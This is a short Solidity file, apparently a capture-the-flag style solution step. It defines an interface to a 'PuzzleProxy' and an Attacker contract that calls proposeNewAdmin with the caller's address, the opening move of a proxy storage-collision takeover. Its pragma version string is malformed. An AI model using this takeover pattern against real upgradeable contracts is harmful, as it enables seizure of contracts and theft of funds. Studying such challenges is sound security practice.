// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7.0;

interface PuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
}

contract Attacker {
    function newAdmin(address _puzzle) public {
        PuzzleProxy(_puzzle).proposeNewAdmin(msg.sender);
    }
}